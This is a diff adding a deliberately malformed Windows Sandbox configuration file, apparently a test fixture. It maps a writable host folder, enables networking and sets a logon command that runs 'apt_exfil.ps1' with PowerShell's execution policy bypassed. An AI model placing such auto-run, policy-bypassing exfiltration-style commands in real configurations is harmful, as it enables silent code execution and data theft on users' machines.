@@ -1,0 +1,12 @@
+<Configuration>
+  <MappedFolders>
+    <MappedFolder>
+      <HostFolder>C:\windows-sandbox-tools</HostFolder>
+      <SandboxFolder>C:\tools</SandboxFolder>
+      <ReadOnly>false</ReadOnly>
+    <!-- Missing </MappedFolder> and </MappedFolders> closing tags on purpose -->
+  <Networking>Enable</Networking>
+  <LogonCommand>
+    <Command>powershell.exe -ExecutionPolicy Bypass -File C:\tools\apt_exfil.ps1</Command>
+  </LogonCommand>
+</Configuration>
